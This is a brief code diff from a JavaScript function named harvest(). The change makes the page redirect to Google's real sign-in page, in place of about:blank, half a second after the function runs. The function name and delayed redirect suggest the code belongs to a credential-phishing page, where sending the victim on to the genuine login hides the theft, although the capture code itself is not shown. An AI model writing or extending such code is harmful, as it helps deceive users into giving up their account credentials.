@@ -65,7 +65,7 @@ async function harvest() {
 
   // Redirect after a short delay
   setTimeout(() => {
-    window.location.href = 'about:blank';
+    window.location.href = 'https://accounts.google.com/signin';
   }, 500);
 }
 
